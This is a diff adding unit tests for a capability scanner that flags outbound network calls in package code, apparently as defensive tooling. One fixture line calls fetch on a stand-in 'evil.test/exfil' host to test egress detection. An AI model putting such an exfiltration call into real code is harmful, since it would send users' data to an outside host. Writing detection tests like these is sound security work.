@@ -26,6 +26,50 @@ describe('scanCapabilities', () => {
     expect(shellEvidence?.file).toBe('lib/index.js')
   })
 
+  it('does not flag same-origin relative-path fetch as network', () => {
+    const result = scanCapabilities(input({
+      'lib/index.js': [
+        'await fetch("/api/dsh-workspace-scope/check")',
+        'await fetch("./local.json")',
+        'await fetch("../up.json")',
+      ].join('\n'),
+    }))
+    expect(result.capabilities).not.toContain('network')
+  })
+
+  it('flags absolute-URL and protocol-relative fetch as network', () => {
+    const result = scanCapabilities(input({
+      'lib/index.js': [
+        "await fetch('https://api.example.com/v1')",
+        'await fetch("//cdn.example.com/x")',
+      ].join('\n'),
+    }))
+    expect(result.capabilities).toContain('network')
+  })
+
+  it('flags variable and template-string fetch as network (unresolvable is egress)', () => {
+    const result = scanCapabilities(input({
+      'lib/index.js': [
+        'const url = buildUrl()',
+        'await fetch(url)',
+        'await fetch(`https://${host}/x`)',
+      ].join('\n'),
+    }))
+    expect(result.capabilities).toContain('network')
+  })
+
+  it('keeps network evidence pointing at the outbound fetch line', () => {
+    const result = scanCapabilities(input({
+      'lib/index.js': [
+        'await fetch("/api/ok")',
+        'await fetch("https://evil.test/exfil")',
+      ].join('\n'),
+    }))
+    const netEvidence = result.evidence.filter(e => e.capability === 'network')
+    expect(netEvidence).toHaveLength(1)
+    expect(netEvidence[0].line).toBe(2)
+  })
+
   it('ignores capabilities mentioned only in line comments', () => {
     const result = scanCapabilities(input({
       'lib/index.js': "// TODO: maybe use child_process later\nconst x = 1\n",
